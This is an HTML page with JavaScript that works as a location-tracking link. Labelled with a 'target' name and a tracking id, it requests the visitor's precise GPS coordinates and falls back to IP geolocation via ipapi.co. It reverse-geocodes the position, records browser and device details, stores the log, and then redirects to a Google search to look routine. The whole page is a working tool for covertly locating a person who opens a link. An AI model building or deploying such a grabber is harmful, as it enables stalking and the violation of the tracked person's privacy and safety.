<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Redirecting...</title>
    <style>
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
            background-color: #f5f5f5;
            text-align: center;
        }
        .container {
            background-color: white;
            padding: 30px;
            border-radius: 8px;
            box-shadow: 0 2px 10px rgba(0, 0, 0, 0.1);
            max-width: 500px;
        }
        h1 {
            color: #2c3e50;
            margin-bottom: 20px;
        }
        p {
            color: #7f8c8d;
            margin-bottom: 30px;
        }
        .spinner {
            border: 4px solid rgba(0, 0, 0, 0.1);
            border-radius: 50%;
            border-top: 4px solid #3498db;
            width: 30px;
            height: 30px;
            animation: spin 1s linear infinite;
            margin: 0 auto 20px;
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        .location-method {
            font-size: 0.8rem;
            color: #3498db;
            margin-top: 10px;
            font-style: italic;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="spinner"></div>
        <h1>Redirecting...</h1>
        <p>Please wait while we track your visit and redirect you.</p>
        <div id="locationMethod" class="location-method">Detecting your location...</div>
    </div>

    <script>
        document.addEventListener('DOMContentLoaded', function() {
            const urlParams = new URLSearchParams(window.location.search);
            const targetName = urlParams.get('target');
            const trackingId = urlParams.get('id');
            const locationMethodEl = document.getElementById('locationMethod');
            
            if (!targetName || !trackingId) {
                window.location.href = 'lacak.html';
                return;
            }
            
            // Base tracking data
            const trackingData = {
                id: trackingId,
                target: targetName,
                timestamp: new Date().toISOString(),
                referrer: document.referrer || 'Direct',
                userAgent: navigator.userAgent,
                platform: navigator.platform,
                screenWidth: window.screen.width,
                screenHeight: window.screen.height,
                language: navigator.language,
                urlParams: window.location.search,
                locationMethod: 'none' // Will be updated based on method used
            };
            
            // First try to get precise GPS coordinates
            if (navigator.geolocation) {
                locationMethodEl.textContent = "Requesting GPS location...";
                
                const geoOptions = {
                    enableHighAccuracy: true,  // Try to get the most accurate location
                    timeout: 5000,             // Wait max 5 seconds for GPS
                    maximumAge: 0              // Don't use cached position
                };
                
                navigator.geolocation.getCurrentPosition(
                    function(position) {
                        // Success - GPS coordinates obtained
                        trackingData.latitude = position.coords.latitude;
                        trackingData.longitude = position.coords.longitude;
                        trackingData.accuracy = position.coords.accuracy; // in meters
                        trackingData.locationMethod = 'gps';
                        locationMethodEl.textContent = "Using precise GPS coordinates";
                        
                        // Reverse geocode to get address info (optional)
                        getAddressFromCoords(position.coords)
                            .then(address => {
                                if (address) {
                                    trackingData.country = address.country;
                                    trackingData.region = address.region;
                                    trackingData.city = address.city;
                                }
                                saveAndRedirect(trackingData, targetName);
                            })
                            .catch(() => saveAndRedirect(trackingData, targetName));
                    },
                    function(error) {
                        // GPS failed - fall back to IP geolocation
                        locationMethodEl.textContent = "Falling back to IP-based location...";
                        getIPLocation(trackingData, targetName);
                    },
                    geoOptions
                );
            } else {
                // Geolocation API not available - use IP
                locationMethodEl.textContent = "Using IP-based location";
                getIPLocation(trackingData, targetName);
            }
            
            // Function to get address from coordinates
            function getAddressFromCoords(coords) {
                return fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${coords.latitude}&lon=${coords.longitude}`)
                    .then(response => response.json())
                    .then(data => {
                        if (data.error) throw new Error(data.error);
                        return {
                            country: data.address?.country,
                            region: data.address?.state || data.address?.county,
                            city: data.address?.city || data.address?.town || data.address?.village
                        };
                    })
                    .catch(error => {
                        console.log('Reverse geocoding failed:', error);
                        return null;
                    });
            }
            
            // Fallback function for IP-based location
            function getIPLocation(trackingData, target) {
                trackingData.locationMethod = 'ip';
                
                fetch('https://ipapi.co/json/')
                    .then(response => {
                        if (!response.ok) throw new Error('Network response was not ok');
                        return response.json();
                    })
                    .then(ipData => {
                        trackingData.ip = ipData.ip;
                        trackingData.country = ipData.country_name;
                        trackingData.region = ipData.region;
                        trackingData.city = ipData.city;
                        if (ipData.latitude && ipData.longitude) {
                            trackingData.latitude = ipData.latitude;
                            trackingData.longitude = ipData.longitude;
                        }
                        saveAndRedirect(trackingData, target);
                    })
                    .catch(error => {
                        console.log('IP geolocation failed, saving basic data');
                        trackingData.ip = 'Unknown';
                        saveAndRedirect(trackingData, target);
                    });
            }
            
            // Final function to save data and redirect
            function saveAndRedirect(data, target) {
                // Show which method was finally used
                locationMethodEl.textContent = data.locationMethod === 'gps' ? 
                    "Used precise GPS location" : 
                    "Used IP-based location";
                
                // Save to localStorage (or Firebase if you prefer)
                const trackingLogs = JSON.parse(localStorage.getItem('trackingLogs') || '[]');
                trackingLogs.unshift(data);
                localStorage.setItem('trackingLogs', JSON.stringify(trackingLogs));
                
                // Redirect after 2-3 seconds
                setTimeout(() => {
                    window.location.href = `https://google.com/search?q=${encodeURIComponent(target)}`;
                }, 2500);
            }
        });
    </script>
</body>
</html>
